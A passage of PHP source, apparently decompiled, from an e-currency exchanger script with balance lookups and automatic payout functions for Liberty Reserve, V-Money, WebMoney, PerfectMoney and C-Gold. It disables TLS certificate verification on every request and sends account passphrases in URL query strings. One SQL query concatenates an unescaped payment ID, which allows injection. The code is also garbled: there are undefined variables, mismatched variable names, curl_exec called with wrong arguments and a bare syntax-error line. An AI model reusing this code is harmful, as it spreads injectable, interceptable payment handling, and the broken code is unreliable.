            $arr_ACCOUNT_DATA['ERROR'] = curl_error( $ch );
        }
        curl_close( $ch );
        ++$i;
    }
    if ( $arr_PAYMENT_RESULT['ERROR'] )
    {
        return $arr_PAYMENT_RESULT['ERROR'];
    }
    $XML_RESULTS = xml2array( $content );
    if ( $XML_RESULTS[id][ERROR][TEXT] )
    {
        $arr_ACCOUNT_DATA['ERROR'] = $XML_RESULTS[id][ERROR][TEXT];
    }
    else
    {
        $arr_ACCOUNT_DATA['BALANCE'] = $XML_RESULTS[id][BALANCE][VALUE];
    }
    return $arr_ACCOUNT_DATA;
}

function liberty_autopay( $PAYER_ACCOUNT = "", $PAYER_PASSWORD = "", $to_account, $PAY_AMOUNT, $PAY_WORTH_VALUE = "" )
{
    global $MEMO;
    global $PAYMENT_ID;
    global $Message_log;
    $arr_PAYMENT_RESULT = array( );
    $arr_LIBERTYRESERVE = get_currency_data( "", "libertyreserve", $PAY_WORTH_VALUE );
    $ramz = new RamzNegar( );
    if ( !$PAYER_PASSWORD )
    {
        $PAYER_PASSWORD = $ramz->decrypt( ramzkey( "number1" ), $arr_LIBERTYRESERVE['MAIN_PASSWORD'] );
    }
    if ( !$PAYER_ACCOUNT )
    {
        $PAYER_ACCOUNT = $arr_LIBERTYRESERVE['ACCOUNT'];
    }
    $to_account = strtoupper( $to_account );
    $liberty_token = create_liberty_token( $PAYER_PASSWORD );
    $data = "<TransferRequest id=\"".$PAYMENT_ID."\">\r\n\t\t\t  <Auth>\r\n\t\t\t\t<ApiName>".$arr_LIBERTYRESERVE['API_NAME']."</ApiName>\r\n\t\t\t\t<Token>".$liberty_token."</Token>\r\n\t\t\t  </Auth>\r\n\t\t\t  <Transfer>\r\n\t\t\t\t<TransferId>".$PAYMENT_ID."</TransferId>\r\n\t\t\t\t<TransferType>transfer</TransferType>\r\n\t\t\t\t<Payer>".$PAYER_ACCOUNT."</Payer>\r\n\t\t\t\t<Payee>".$to_account."</Payee>\r\n\t\t\t\t<CurrencyId>".$arr_LIBERTYRESERVE['currency_worth_value']."</CurrencyId>\r\n\t\t\t\t<Amount>".$PAY_AMOUNT."</Amount>\r\n\t\t\t\t<Memo>".$MEMO."</Memo>\r\n\t\t\t\t<Anonymous>false</Anonymous>\r\n\t\t\t  </Transfer>\r\n\t\t\t</TransferRequest>";
    $data = str_replace( "\t", "", $data );
    $url = "https://api.libertyreserve.com/xml/transfer.aspx?req=".urlencode( $data );
    $ch = curl_init( );
    curl_setopt( $ch, CURLOPT_URL, $url );
    curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 2 );
    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, FALSE );
    curl_setopt( $ch, CURLOPT_TIMEOUT, 10 );
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, TRUE );
    curl_setopt( $ch, CURLOPT_FAILONERROR, 1 );
    $i = 0;
    while ( $i < 1 )
    {
        $result = curl_exec( $ch );
        $data = "";
        ++$i;
    }
    $arr_PAYMENT_RESULT['ERROR'] = curl_error( $ch );
    curl_close( $ch );
    if ( $arr_PAYMENT_RESULT['ERROR'] )
    {
        return $arr_PAYMENT_RESULT['ERROR'];
    }
    $XML_RESULTS = xml2array( $result );
    if ( $XML_RESULTS[$PAYMENT_ID][ERROR][CODE] )
    {
        if ( strlen( $result ) == 0 )
        {
            $arr_PAYMENT_RESULT['ERROR'] = "LibertyReserve Server is Down, No response";
        }
        $arr_PAYMENT_RESULT['ERROR'] = $XML_RESULTS[$PAYMENT_ID][ERROR][TEXT];
    }
    else
    {
        $arr_PAYMENT_RESULT['BATCH'] = $XML_RESULTS[$PAYMENT_ID][RECEIPT][RECEIPTID];
        if ( empty( $arr_PAYMENT_RESULT['BATCH'] ) )
        {
            $arr_PAYMENT_RESULT['ERROR'] .= "LibertyReserve payment: ".$PAYMENT_ID.", Check your Liberty Reserve transaction history to ensure that no transfers were made before trying to repeat the same transfers.<br>".htmlspecialchars( $result );
        }
    }
    $Message_log[] = "LibertyReserve auto payout class";
    Write_File( $arr_PAYMENT_RESULT );
    return $arr_PAYMENT_RESULT;
}

function liberty_autocheck( $Batch_number, $PAYMENT_ID )
{
    global $MEMO;
    global $Message_log;
    global $_exchange_lines;
    global $_currencies;
    $arr_LIBERTYRESERVE = get_currency_data( "", "libertyreserve" );
    $ramz = new RamzNegar( );
    if ( !$PAYER_PASSWORD )
    {
        $PAYER_PASSWORD = $ramz->decrypt( ramzkey( "number1" ), $arr_LIBERTYRESERVE['MAIN_PASSWORD'] );
    }
    $nvar = db_get_array( "SELECT src_cid, src_amount FROM {$_exchange_lines} WHERE eid='".$PAYMENT_ID."'" );
    $src_cid = $nvar[0];
    $src_amount = $nvar[1];
    $worth_value = db_get_id( "SELECT currency_worth_value FROM {$_currencies} WHERE cid='{$src_cid}'" );
    if ( !$src_cid || !$worth_value )
    {
        $arr_HISTORY_RESULT['ERROR'] = "LR Invalid exchange data for online check history";
    }
    $liberty_token = create_liberty_token( $PAYER_PASSWORD );
    $data = "<HistoryRequest id=\"".$PAYMENT_ID."\">\r\n\t\t\t\t  <Auth>\r\n\t\t\t\t\t<ApiName>".$arr_LIBERTYRESERVE['API_NAME']."</ApiName>\r\n\t\t\t\t\t<Token>".$liberty_token."</Token>\r\n\t\t\t\t  </Auth>\r\n\t\t\t\t  <History>\r\n\t\t\t\t\t<CurrencyId>".$worth_value."</CurrencyId>\r\n\t\t\t\t\t<AccountId>".$arr_LIBERTYRESERVE['ACCOUNT']."</AccountId>\r\n\t\t\t\t\t<ReceiptId>".$Batch_number."</ReceiptId>\r\n\t\t\t\t  </History>\r\n\t\t\t  </HistoryRequest>";
    $data = str_replace( "\t", "", $data );
    $url = "https://api.libertyreserve.com/xml/history.aspx?req=".urlencode( $data );
    $ch = curl_init( );
    curl_setopt( $ch, CURLOPT_URL, $url );
    curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 2 );
    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, FALSE );
    curl_setopt( $ch, CURLOPT_TIMEOUT, 10 );
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, TRUE );
    curl_setopt( $ch, CURLOPT_FAILONERROR, 1 );
    $i = 0;
    while ( $i < 1 )
    {
        $result = curl_exec( $ch );
        $data = "";
        ++$i;
    }
    if ( curl_errno( $ch ) != 0 )
    {
        $arr_HISTORY_RESULT['ERROR'] = curl_error( $ch );
    }
    curl_close( $ch );
    if ( $arr_HISTORY_RESULT['ERROR'] )
    {
        return $arr_HISTORY_RESULT['ERROR'];
    }
    $XML_RESULTS = xml2array( $result );
    if ( $XML_RESULTS[$PAYMENT_ID][ERROR][CODE] )
    {
        if ( strlen( $result ) == 0 )
        {
            $arr_HISTORY_RESULT['ERROR'] = "LibertyReserve Server is Down, No response";
        }
        $arr_HISTORY_RESULT['ERROR'] = $XML_RESULTS[$PAYMENT_ID][ERROR][TEXT];
        $result = false;
    }
    else if ( $XML_RESULTS[$PAYMENT_ID][RECEIPT][TRANSFER][CURRENCYID] == $worth_value && cutzero( $XML_RESULTS[$PAYMENT_ID][RECEIPT][TRANSFER][AMOUNT] ) == $src_amount )
    {
        $Message_log[] = "LR online check history was successfull.";
        $result = true;
    }
    else
    {
        $Message_log[] = "LR payment does not found in online check history";
        $result = false;
    }
    Write_File( $arr_HISTORY_RESULT );
    return $result;
}

function isValid_vmoney_AccountNumber( $acct )
{
    return ereg( "^[0-9]{1,}\$", $acct );
}

function create_vmoney_Token( )
{
    $arr_VMONEY = get_currency_data( "", "v-money" );
    $ramz = new RamzNegar( );
    $arr_VMONEY['MAIN_PASSWORD'] = $ramz->decrypt( ramzkey( "number1" ), $arr_VMONEY['MAIN_PASSWORD'] );
    $ramz = new RamzNegar( );
    $arr_VMONEY['PIN_NUMBER'] = $ramz->decrypt( ramzkey( "number1" ), $arr_VMONEY['PIN_NUMBER'] );
    $datePart = gmdate( "Ymd" );
    $timePart = gmdate( "H" );
    $token = md5( $arr_VMONEY['ACCOUNT'].md5( $arr_VMONEY['MAIN_PASSWORD'] ).$arr_VMONEY['PIN_NUMBER'].$datePart.$timePart );
    return $token;
}

function fetch_vmoney_AccountBalance( )
{
    $vmoney_token = create_vmoney_token( );
    $arr_VMONEY = get_currency_data( "", "v-money" );
    $data .= "<Auth><AccountId>".$arr_VMONEY['ACCOUNT']."</AccountId><Token>".$vmoney_token."</Token></Auth>";
    $data .= "</Request>";
    $i = 0;
    while ( $i < 1 )
    {
        $ch = curl_init( );
        curl_setopt( $ch, CURLOPT_URL, "https://www.v-money.net/vai.php?request_data=".$data );
        curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $Var_888, CURLOPT_SSL_VERIFYHOST, 2 );
        curl_setopt( $ch, CURLOPT_TIMEOUT, 5 );
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, TRUE );
        $result = curl_exec( $ch );
        if ( curl_errno( $ch ) != 0 )
        {
            $arr_ACCOUNT_DATA['ERROR'] = curl_error( $ch );
        }
        curl_close( $ch );
        ++$i;
    }
    if ( $arr_PAYMENT_RESULT['ERROR'] )
    {
        return $arr_PAYMENT_RESULT['ERROR'];
    }
    if ( stristr( $result, "Fail" ) )
    {
        $result_data = explode( "</Message>", strstr( $result, "<Message>" ) );
        $arr_ACCOUNT_DATA['ERROR'] = strip_tags( $result_data[0] );
    }
    else
    {
        $Var_1872 = explode( "</Balance>", strstr( $result, "<Balance>" ) );
        $arr_ACCOUNT_DATA['BALANCE'] = strip_tags( $result_data[0] );
    }
    return $arr_ACCOUNT_DATA;
}

function fetch_vmoney_AccountName( $account )
{
    global $arr_ACCOUNT_DATA;
    $arr_ACCOUNT_DATA = array( );
    $arr_VMONEY = get_currency_data( "", "v-money" );
    $vmoney_token = create_vmoney_token( );
    $data = "<Request><Type>AccountStatus</Type>";
    $data .= "<Auth><AccountId>".$arr_VMONEY['ACCOUNT']."</AccountId><Token>".$vmoney_token."</Token></Auth>";
    $data .= "<LookupAccountId>".$account."</LookupAccountId></Request>";
    $i = 0;
    while ( $i < 1 )
    {
        $ch = curl_init( );
        curl_setopt( $ch, CURLOPT_URL, "https://www.v-money.net/vai.php?request_data=".$data );
        curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 2 );
        curl_setopt( $ch, CURLOPT_TIMEOUT, 5 );
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, TRUE );
        if ( curl_errno( $ch ) != 0 )
        {
            $arr_ACCOUNT_DATA['ERROR'] = curl_error( $ch );
        }
        curl_close( $ch );
        ++$i;
    }
    if ( $arr_PAYMENT_RESULT['ERROR'] )
    {
        return $arr_PAYMENT_RESULT['ERROR'];
    }
    if ( stristr( $result, "Fail" ) )
    {
        $result_data = explode( "</Message>", strstr( $result, "<Message>" ) );
        $arr_ACCOUNT_DATA['ERROR'] = strip_tags( $result_data[0] );
    }
    else
    {
        $result_data = explode( "</AccountName>", strstr( $result, "<AccountName>" ) );
        $arr_ACCOUNT_DATA['NAME'] = strip_tags( $result_data[0] );
        $result_data = curl_exec( "</AccountStatus>", strstr( $result, "<AccountStatus>" ) );
        $result_data = explode( "</Status>", strstr( $result_data[0], "<Status>" ) );
        if ( strip_tags( $result_data[0] ) != "Open" )
        {
            $arr_ACCOUNT_DATA['ERROR'] = "Your account status is: ".$result_data[0];
        }
    }
    return $arr_ACCOUNT_DATA;
}

function vmoney_autopay( $PAYER_ACCOUNT = "", $PAYER_PASSWORD = "", $to_account, $PAY_AMOUNT )
{
    global $MEMO;
    global $PAYMENT_ID;
    global $Message_log;
    $arr_PAYMENT_RESULT = array( );
    $arr_VMONEY = get_currency_data( "", "v-money" );
    $ramz = new RamzNegar( );
    $arr_VMONEY['MAIN_PASSWORD'] = $ramz->decrypt( ramzkey( "number1" ), $arr_VMONEY['MAIN_PASSWORD'] );
    if ( !$PAYER_ACCOUNT )
    {
        $PAYER_ACCOUNT = $arr_VMONEY['ACCOUNT'];
    }
    if ( !$PAYER_PASSWORD )
    {
        $PAYER_PASSWORD = $arr_VMONEY['MAIN_PASSWORD'];
    }
    $vmoney_token = create_vmoney_token( );
    $data = "<Request><Type>Transfer</Type>";
    $data .= "<Auth><AccountId>".$arr_VMONEY['ACCOUNT']."</AccountId><Token>".$vmoney_token."</Token></Auth>";
    $data .= "<Transfers><Transfer><ID>".$PAYMENT_ID."</ID><Payee>".$to_account."</Payee><Amount>".$PAY_AMOUNT."</Amount><Memo>".$MEMO."</Memo></Transfer></Transfers>";
    $data .= "</Request>";
    $url = "https://www.v-money.net/vai.php?request_data=".urlencode( $data );
    $ch = curl_init( );
    curl_setopt( $ch, CURLOPT_URL, $url );
    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, FALSE );
    curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 2 );
    curl_setopt( $ch, CURLOPT_TIMEOUT, 5 );
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, TRUE );
    curl_setopt( $ch, CURLOPT_FAILONERROR, 1 );
    $i = 0;
    while ( $i < 1 )
    {
        $result = curl_exec( $ch );
        $data = "";
        ++$i;
    }
    if ( curl_errno( $ch ) != 0 )
    {
        $arr_PAYMENT_RESULT['ERROR'] = curl_error( $ch );
    }
    curl_close( $ch );
    if ( $arr_PAYMENT_RESULT['ERROR'] )
    {
        return $arr_PAYMENT_RESULT['ERROR'];
    }
    if ( strlen( $result ) == 0 || stristr( $result, "Error" ) )
    {
        if ( strlen( $result ) == 0 )
        {
            $arr_PAYMENT_RESULT['ERROR'] = "V-money Server is Down, No response";
        }
        $result_data = explode( "</Message>", strstr( $result, "<Message>" ) );
        $arr_PAYMENT_RESULT['ERROR'] .= strip_tags( $result_data[0] );
        $result_data2 = explode( "</Message>", strstr( $result_data[1], "<Message>" ) );
        $arr_PAYMENT_RESULT['ERROR'] .= strip_tags( $result_data2[0] );
    }
    else
    {
        $result_data = explode( "</Batch>", strstr( $result, "<Batch>" ) );
        $arr_PAYMENT_RESULT['BATCH'] .= strip_tags( $result_data[0] );
        if ( empty( $arr_PAYMENT_RESULT['BATCH'] ) )
        {
            $arr_PAYMENT_RESULT['ERROR'] .= "V-money payment ".$PAYMENT_ID." Check your V-money transaction history to ensure that no transfers were made before trying to repeat the same transfers.<br>".htmlspecialchars( $result );
        }
    }
    $Message_log[] = "V-Money auto payout class";
    Write_File( $arr_PAYMENT_RESULT, $result );
    return $arr_PAYMENT_RESULT;
}

function isValid_webmoney_AccountNumber( $acct )
{
    return ereg( "^[A-Z][0-9]{12}\$", strtoupper( $acct ) );
}

function fetch_webmoney_AccountBalance( )
{
    global $Message_log;
    global $CONFIG;
    $arr_WEBMONEY = array( );
    $arr_WEBMONEY = get_currency_data( "", "webmoney" );
    $ramz = new RamzNegar( );
    $KEY_PASSWORD = $ramz->decrypt( ramzkey( "number1" ), $arr_WEBMONEY['MAIN_PASSWORD'] );
    $WMID_ACCOUNT = $arr_WEBMONEY['API_NAME'];
    if ( !$KEY_PASSWORD || !$WMID_ACCOUNT )
    {
        return false;
    }
    define( "DOC_ENCODING", "utf-8" );
    include_once( "include/wmtransfer/wmxi.php" );
    $wmxi = new WMXI( realpath( $CONFIG['keys_folder']."/WebMoneyCA.crt" ), DOC_ENCODING );
    $wmxi->Classic( $WMID_ACCOUNT, $KEY_PASSWORD, realpath( $CONFIG['keys_folder']."/key.kwm" ) );
    include_once( "include/wmtransfer/wmxiparser.php" );
    $parser = new WMXIParser( );
    $response = $wmxi->X9( trim( $WMID_ACCOUNT ) );
    $structure = $parser->Parse( $response, DOC_ENCODING );
    $transformed = $parser->Reindex( $structure, true );
    if ( $transformed['w3s.response']['retval'] || $transformed['w3s.response']['retdesc'] )
    {
        $arr_ACCOUNT_DATA['ERROR'] = "Error happend:<br>: ".$transformed['w3s.response']['retdesc'];
    }
    else
    {
        $items = $structure['0']['node']['1']['node'];
        $items = is_array( $items ) ? $items : array( );
        foreach ( $items as $k => $v )
        {
            $vv = $parser->Reindex( $v['node'], true );
            $result .= "<br />Purse:".trim( htmlspecialchars( $vv['pursename'], ENT_QUOTES ) );
            $result .= " -> ".trim( htmlspecialchars( $vv['desc'], ENT_QUOTES ) );
            $result .= " -> ".trim( htmlspecialchars( $vv['amount'], ENT_QUOTES ) );
        }
        $arr_ACCOUNT_DATA['BALANCE'] = $result;
    }
    $Message_log[] = "Webmoney fetch balance class";
    return $arr_ACCOUNT_DATA;
}

function webmoney_autopay( $to_account, $PAY_AMOUNT, $PAY_WORTH_VALUE )
{
    global $MEMO;
    global $PAYMENT_ID;
    global $Message_log;
    global $CONFIG;
    $arr_WEBMONEY = array( );
    $arr_WEBMONEY = get_currency_data( "", "webmoney", $PAY_WORTH_VALUE );
    $ramz = new RamzNegar( );
    $KEY_PASSWORD = $ramz->decrypt( ramzkey( "number1" ), $arr_WEBMONEY['MAIN_PASSWORD'] );
    $WMID_ACCOUNT = $arr_WEBMONEY['API_NAME'];
    $PAYER_ACCOUNT = $arr_WEBMONEY['ACCOUNT'];
    define( "DOC_ENCODING", "utf-8" );
    include_once( "include/wmtransfer/wmxi.php" );
    $wmxi = new WMXI( realpath( $CONFIG['keys_folder']."/WebMoneyCA.crt" ), DOC_ENCODING );
    $wmxi->Classic( $WMID_ACCOUNT, $KEY_PASSWORD, realpath( $CONFIG['keys_folder']."/key.kwm" ) );
    include_once( "include/wmtransfer/wmxiparser.php" );
    $parser = new WMXIParser( );
    $response = $wmxi->X2( intval( $PAYMENT_ID ), $PAYER_ACCOUNT, $to_account, floatval( $PAY_AMOUNT ), 0, "", $MEMO, 0 );
    $structure = $parser->Parse( $response, DOC_ENCODING );
    $transformed = $parser->Reindex( $structure, true );
    if ( $transformed['w3s.response']['retval'] || $transformed['w3s.response']['retdesc'] )
    {
        $arr_PAYMENT_RESULT['ERROR'] = "Error happend:<br>: ".$transformed['w3s.response']['retval'].": ".$transformed['w3s.response']['retdesc'];
    }
    else
    {
        $arr_PAYMENT_RESULT['BATCH'] = $transformed['w3s.response']['operation']['tranid'];
        if ( !$arr_PAYMENT_RESULT['BATCH'] )
        {
            $arr_PAYMENT_RESULT['ERROR'] = "Batch number didn not find, <br>: '".$transformed['w3s.response']['retval'].": ".$transformed['w3s.response']['retdesc'];
        }
    }
    Write_File( $arr_PAYMENT_RESULT, vardump( $arr_PAYMENT_RESULT ) );
    return $arr_PAYMENT_RESULT;
}

function isValid_perfectmoney_AccountNumber( $acct )
{
    return ereg( "^(U|E|G)[0-9]{4,10}\$", $acct );
}

function fetch_perfectmoney_AccountBalance( )
{
    $arr_PERFECTMONEY = array( );
    $arr_PERFECTMONEY = get_currency_data( "", "perfectmoney" );
    $ramz = new RamzNegar( );
    $arr_PERFECTMONEY['MAIN_PASSWORD'] = $ramz->decrypt( ramzkey( "number1" ), $arr_PERFECTMONEY['MAIN_PASSWORD'] );
    $ACCOUNT_ID = $arr_PERFECTMONEY['API_NAME'];
    $f = fopen( "https://perfectmoney.com/acct/balance.asp?AccountID=".$ACCOUNT_ID."&PassPhrase=".$arr_PERFECTMONEY['MAIN_PASSWORD'], "rb" );
    if ( $f === false )
    {
        $arr_ACCOUNT_DATA['ERROR'] = "Error openning perfectmoney url";
    }
    $out = array( );
    $out = "";
    $result = "";
    while ( !feof( $f ) )
    {
        $out .= fgets( $f );
    }
    fclose( $f );
    if ( !preg_match_all( "/<input name='(.*)' type='hidden' value='(.*)'>/", $out, $result, PREG_SET_ORDER ) )
    {
        $arr_ACCOUNT_DATA['ERROR'] = "Ivalid output";
    }
    $ar = "";
    $item = "";
    foreach ( $result as $item )
    {
        $key = $item[1];
        $ar[$key] = $item[2];
    }
    $arr_ACCOUNT_DATA['BALANCE'] = "<pre>";
    $arr_ACCOUNT_DATA['BALANCE'] .= vardump( $ar );
    $arr_ACCOUNT_DATA['BALANCE'] .= "</pre>";
    return $arr_ACCOUNT_DATA;
}

function fetch_perfectmoney_AccountName( $account )
{
}

function perfectmoney_autopay( $PAYER_ACCOUNT = "", $PAYER_PASSWORD = "", $to_account, $PAY_AMOUNT, $PAY_WORTH_VALUE = "" )
{
    global $MEMO;
    global $PAYMENT_ID;
    global $uploaded;
    global $Message_log;
    $arr_PAYMENT_RESULT = array( );
    $arr_PERFECTMONEY = get_currency_data( "", "perfectmoney", $PAY_WORTH_VALUE );
    $ramz = new RamzNegar( );
    $arr_PERFECTMONEY['MAIN_PASSWORD'] = $ramz->decrypt( ramzkey( "number1" ), $arr_PERFECTMONEY['MAIN_PASSWORD'], $PAY_WORTH_VALUE );
    if ( !$PAYER_ACCOUNT )
    {
        $PAYER_ACCOUNT = $arr_PERFECTMONEY['ACCOUNT'];
    }
    $ACCOUNT_ID = $arr_PERFECTMONEY['API_NAME'];
    if ( !$PAYER_PASSWORD )
    {
        $PAYER_PASSWORD = $arr_PERFECTMONEY['MAIN_PASSWORD'];
    }
    $url = "https://perfectmoney.com/acct/confirm.asp?AccountID=".$ACCOUNT_ID."&PassPhrase=".$PAYER_PASSWORD."&Payer_Account=".$PAYER_ACCOUNT."&Payee_Account=".$to_account."&Amount=".FormatPrice( $PAY_AMOUNT )."&PAY_IN=1&PAYMENT_ID=".$PAYMENT_ID;
    $f = fopen( $url, "rb" );
    if ( $f === false )
    {
        $arr_PAYMENT_RESULT['ERROR'] = "error openning PerfectMoney url";
    }
    $out = array( );
    $out = "";
    while ( !feof( $f ) )
    {
        $out .= fgets( $f );
    }
    fclose( $f );
    if ( !preg_match_all( "/<input name='(.*)' type='hidden' value='(.*)'>/", $out, $result, PREG_SET_ORDER ) )
    {
        $arr_PAYMENT_RESULT['ERROR'] = "Ivalid PerfectMoney output";
    }
    $ar = "";
    foreach ( $result as $item )
    {
        $key = $item[1];
        $ar[$key] = $item[2];
    }
    if ( $ar['PAYMENT_BATCH_NUM'] )
    {
        $arr_PAYMENT_RESULT['BATCH'] = $ar['PAYMENT_BATCH_NUM'];
    }
    else
    {
        if ( strlen( $result ) == 0 )
        {
            $arr_PAYMENT_RESULT['ERROR'] = "PerfectMoney Server is Down, No response";
        }
        $arr_PAYMENT_RESULT['ERROR'] = $ar['ERROR'];
    }
    $Message_log[] = "PerfectMoney auto payout class";
    Write_File( $arr_PAYMENT_RESULT, $ar );
    return $arr_PAYMENT_RESULT;
}

function isValid_cgold_AccountNumber( $acct )
{
    return ereg( "^[0-9]{1,}\$", $acct );
}

function cgold_autopay( $PAYER_ACCOUNT = "", $PAYER_PASSWORD = "", $to_account, $PAY_AMOUNT, $PAY_WORTH_VALUE = "" )
{
    global $MEMO;
    global $PAYMENT_ID;
    global $CONFIG;
    global $Message_log;
    $arr_PAYMENT_RESULT = array( );
    $arr_CGOLD = get_currency_data( "", "c-gold", $PAY_WORTH_VALUE );
    $ramz = new RamzNegar( );
    if ( !$PAYER_PASSWORD )
    {
        $PAYER_PASSWORD = $ramz->decrypt( ramzkey( "number1" ), $arr_CGOLD['MAIN_PASSWORD'] );
    }
    if ( !$PAYER_ACCOUNT )
    {
        $PAYER_ACCOUNT = $arr_CGOLD['ACCOUNT'];
    }
    $user_agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)";
    $header[] = "Accept: text/vnd.wap.wml,*.*";
    $url = "https://c-gold.com/clicktopay/";
    $params = "forced_payer_account=".$PAYER_ACCOUNT;
    $params .= "&payee_account=".$to_account;
    $params .= "&payee_name=".$CONFIG['SITE_NAME']." Customer";
    $params .= "&payment_amount=".$PAY_AMOUNT;
    $params .= "&payment_units=".strtoupper( $PAY_WORTH_VALUE )." worth&payment_id=".$PAYMENT_ID;
    $params .= "&suggested_memo=".$MEMO;
    $ch = curl_init( );
    curl_setopt( $ch, CURLOPT_POSTFIELDS, $params );
    curl_setopt( $ch, CURLOPT_URL, $url );
    curl_setopt( $ch, CURLOPT_POST, 1 );
    curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1 );
    curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 2 );
    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, FALSE );
    curl_setopt( $ch, CURLOPT_TIMEOUT, 15 );
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, TRUE );
    curl_setopt( $ch, CURLOPT_USERAGENT, $user_agent );
    curl_setopt( $ch, CURLOPT_COOKIEFILE, "_skins_tmp/cookiefile" );
    curl_setopt( $ch, CURLOPT_COOKIEJAR, "_skins_tmp/cookiefile" );
    curl_setopt( $ch, CURLOPT_COOKIE, session_name( )."=".session_id( ) );
    curl_setopt( $ch, CURLOPT_COOKIESESSION, TRUE );
    ( $ch, CURLOPT_VERBOSE, 1 );
    curl_setopt( $ch, CURLOPT_HTTPHEADER, $header );
    $result = curl_exec( $ch );
    if ( curl_errno( $ch ) != 0 )
    {
        $arr_ACCOUNT_DATA['ERROR'] = curl_error( $ch );
    }
    curl_close( $ch );
    $sigil_code = "name='sigil1' value='";
    $pos = strpos( $result, $sigil_code );
    $sigill = substr( $result, $pos + strlen( $sigil_code ), 32 );
    if ( $sigill )
    {
        $url = "https://c-gold.com/clicktopay/preview.php";
        $params = "sigil1=".$sigill;
        $params .= "&pay_from=".$PAYER_ACCOUNT;
        $params .= "&passphrase=".$PAYER_PASSWORD;
        $params .= "&memo=".$MEMO;
        $params .= "&submit=Preview";
        $ch = curl_init( );
        curl_setopt( $ch, CURLOPT_POSTFIELDS, $params );
        curl_setopt( $ch, CURLOPT_URL, $url );
        curl_setopt( $ch, CURLOPT_POST, 1 );
        curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1 );
        curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 2 );
        curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $ch, CURLOPT_TIMEOUT, 15 );
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, TRUE );
        curl_setopt( $ch, CURLOPT_USERAGENT, $user_agent );
        curl_setopt( $ch, CURLOPT_COOKIEFILE, "cookiefile" );
        curl_setopt( $ch, CURLOPT_COOKIEJAR, "cookiefile" );
        curl_setopt( $ch, CURLOPT_COOKIE, session_name( )."=".session_id( ) );
        curl_setopt( $ch, CURLOPT_COOKIESESSION, TRUE );
        curl_setopt( $ch, CURLOPT_VERBOSE, 1 );
        curl_setopt( $ch, CURLOPT_HTTPHEADER, $header );
        $result = curl_exec( $ch );
        if ( curl_errno( $ch ) != 0 )
        {
            $arr_ACCOUNT_DATA['ERROR'] = curl_error( $ch );
        }
        curl_close( $ch );
    }
    $sigil_code = "name='sigil2' value='";
    $pos = strpos( $result, $sigil_code );
    $sigil2 = substr( $result, $pos + strlen( $sigil_code ), 32 );
    if ( $sigil2 )
    {
        $url = "https://c-gold.com/clicktopay/confirm.php";
        $params = "sigil2=".$sigil2;
        $params .= "&pay_from=".$PAYER_ACCOUNT;
        $params .= "&passphrase=".$PAYER_PASSWORD;
        $params .= "&memo=".$MEMO;
        $params .= "&submit=CONFIRM this Payment";
        $ch = curl_init( );
        curl_setopt( $ch, CURLOPT_POSTFIELDS, $params );
        curl_setopt( $ch, CURLOPT_URL, $url );
        curl_setopt( $ch, CURLOPT_POST, 1 );
        curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1 );
        curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 2 );
        curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $ch, CURLOPT_TIMEOUT, 15 );
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, TRUE );
        curl_setopt( $ch, CURLOPT_USERAGENT, $user_agent );
        curl_setopt( $ch, CURLOPT_COOKIEFILE, "cookiefile" );
        curl_setopt( $ch, CURLOPT_COOKIEJAR, "cookiefile" );
        curl_setopt( $ch, CURLOPT_COOKIE, session_name( )."=".session_id( ) );
        curl_setopt( $ch, CURLOPT_COOKIESESSION, TRUE );
        curl_setopt( $ch, CURLOPT_VERBOSE, 1 );
        curl_setopt( $ch, CURLOPT_HTTPHEADER, $header );
        $result = curl_exec( $ch );
        if ( curl_errno( $ch ) != 0 )
        {
            $arr_ACCOUNT_DATA['ERROR'] = curl_error( $ch );
        }
        curl_close( $ch );
        $transaction_code = "<font size='+1'><b>";
        $pos = strpos( $result, $transaction_code );
        $BATCH = substr( $result, $pos + strlen( $transaction_code ), 6 );
    }
    if ( strpos( $result, "Transaction Confirmed" ) )
    {
        $arr_PAYMENT_RESULT['BATCH'] = $BATCH;
        if ( empty( $arr_PAYMENT_RESULT['BATCH'] ) )
        {
            $arr_PAYMENT_RESULT['ERROR'] .= "C-GOLD payment: ".$PAYMENT_ID.", Check your Liberty Reserve transaction history to ensure that no transfers were made before trying to repeat the same transfers.<br>".htmlspecialchars( $result );
        }
    }
    else
    {
        $arr_PAYMENT_RESULT['ERROR'] = "Page result: ".$result;
    }
    $Message_log[] = "C-gold auto payout class";
    Write_File( $arr_PAYMENT_RESULT );
    return $arr_PAYMENT_RESULT;
}

function egold_form_inc_php( )
{
    global $RESPONSE_OK;
    global $RESPONSE_NO;
    global $PAYEE_NAME;
    global $amount;
    global $MEMO;
    global $payment_id;
    global $baggage_fields;
    global $_currencies;
    global $cid;
    global $CONFIG;
    global $SAFE_PAYMENT_URL;
    global $PAYMENT_VERIFIER;
    global $CONFIG;
    $arr_EGOLD = get_currency_data( $cid );
    if ( !$PAYMENT_VERIFIER )
    {
        $PAYMENT_VERIFIER = $CONFIG['SITE_URL_SECURE']."/".$arr_EGOLD['CURRENCY_VERIFIER'];
    }
